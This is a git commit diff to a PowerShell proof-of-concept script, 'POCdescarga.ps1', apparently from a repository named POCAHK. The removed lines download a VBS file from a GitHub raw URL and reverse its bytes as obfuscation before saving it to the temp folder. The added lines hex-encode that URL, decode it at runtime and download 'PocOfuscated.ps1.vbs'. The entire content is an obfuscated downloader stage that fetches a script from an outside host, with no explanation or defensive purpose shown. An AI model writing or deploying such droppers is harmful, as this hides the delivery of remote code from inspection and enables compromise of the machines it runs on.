87d3f1253137186193795831f8460d6ce78f2b3b
Jabato96 <92057137+Jabato96@users.noreply.github.com>
2024-07-03 12:14:12 +0200

    Update POCdescarga.ps1

--- POCdescarga.ps1
+++ POCdescarga.ps1
@@ -1,16 +1,6 @@
-$url = "https://raw.githubusercontent.com/Jabato96/POCAHK/main/PocOfuscated.vbs"
-$destinationPath = "$env:TEMP\downloadedFile.tmp"
-
-
-$webClient = New-Object System.Net.WebClient
-
-
-$fileBytes = $webClient.DownloadData($url)
-
-
-$ofuscatedBytes = [System.Linq.Enumerable]::Reverse($fileBytes)
-
-
-[System.IO.File]::WriteAllBytes($destinationPath, $ofuscatedBytes)
-
-Write-Host "Archivo descargado y ofuscado guardado en $destinationPath"
+$hex = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4a616261746f39362f504f4341484b2f6d61696e2f506f634f66757363617465642e7073312e766273"
+$url = ""
+for ($i = 0; $i -lt $hex.Length; $i += 2) {
+    $url += [char][convert]::ToUInt32($hex.Substring($i, 2), 16);
+}
+Invoke-WebRequest -Uri $url -OutFile "PocOfuscated.ps1.vbs"
